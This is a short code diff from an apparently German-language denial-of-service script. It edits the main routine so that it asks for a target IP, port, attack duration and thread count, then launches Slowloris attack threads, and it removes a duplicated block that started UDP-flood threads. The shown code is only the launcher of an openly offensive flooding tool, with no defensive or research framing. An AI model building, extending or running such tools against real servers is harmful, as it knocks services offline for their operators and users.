@@ -151,20 +151,10 @@ if __name__ == "__main__":
             port = int(input("Ziel-Port: "))
             duration = int(input("Dauer des Angriffs (Sekunden): "))
             threads = int(input("Anzahl der Threads: "))
-
             slowloris_attack(ip, port, threads, duration)
-
 
             stop_event.clear()
 
-            # Threads starten
-            attack_threads = [
-                threading.Thread(target=udp_flood, args=(ip, port, packet_size, packet_rate))
-                for _ in range(threads)
-            ]
-            for thread in attack_threads:
-                thread.start()
-                
             # Threads starten
             attack_threads = [
                 threading.Thread(target=slowloris, args=(ip, port))
